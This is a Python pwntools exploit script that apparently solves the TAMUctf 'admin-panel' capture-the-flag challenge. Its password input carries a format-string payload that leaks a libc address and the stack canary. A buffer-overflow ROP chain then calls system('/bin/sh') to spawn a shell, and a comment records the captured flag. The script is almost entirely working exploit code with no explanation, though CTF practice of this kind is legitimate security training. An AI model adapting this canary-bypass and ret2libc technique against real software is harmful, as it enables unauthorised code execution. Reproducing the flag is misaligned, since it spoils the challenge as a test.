#!/usr/bin/env python3
from os import system
from pwn import *
exe = ELF("./admin-panel_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.28.so")
p = process([exe.path])
# p = remote("tamuctf.com", 443, ssl=True, sni="admin-panel")
# def GDB():
#     context.terminal = ["alacritty", "-e"]
#     gdb.attach(p, gdbscript='''
#
#                # b*0x555555555496
#                b*main+279
#                # #
#                # b*0x00005555555552ff
#                b*admin+281
#
#            ''')

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
rec = lambda data: p.recvuntil(data)


def main():
    # GDB()
    # good luck pwning :)
    sla(b"username of length 16:",b"admin")
    sla(b"password of length 24:",b"secretpass123"+b"\0"+b"a"*18 + b"%17$plm%15$p")
    rec(b"entered: admin\n")
    leak = p.recv(34).split(b"lm")
    addr = int(leak[0],16)
    canary = int(leak[1],16)
    base_libc = addr -0x2409b
    system_libc = base_libc + libc.symbols["system"]
    bin_sh = base_libc + next(libc.search(b"/bin/sh"))
    pop_rdi = base_libc + 0x0000000000023a5f
    # addr = int(p.recv(14),16)
    log.info(f"pop rdi: " + hex(pop_rdi))
    log.info(f"bin sh: " + hex(bin_sh))
    log.info(f"system: " + hex(system_libc))
    log.info(f"base: " + hex(base_libc))
    log.info(f"leak canary: " + hex(canary))
    log.info(f"leak addr : " +hex(addr))
    sla(b"3:",b"2")
    payload = b"a"*72
    payload += p64(canary)   
    payload += p64(0)
    payload += p64(pop_rdi) 
    payload += p64(bin_sh)
    payload += p64(system_libc)

    sla(b"on what went wrong:", payload  )




#gigem{l3ak1ng_4ddre55e5_t0_byp4ss_s3cur1t1e5!!}
    p.interactive()





















if __name__ == "__main__":
    main()
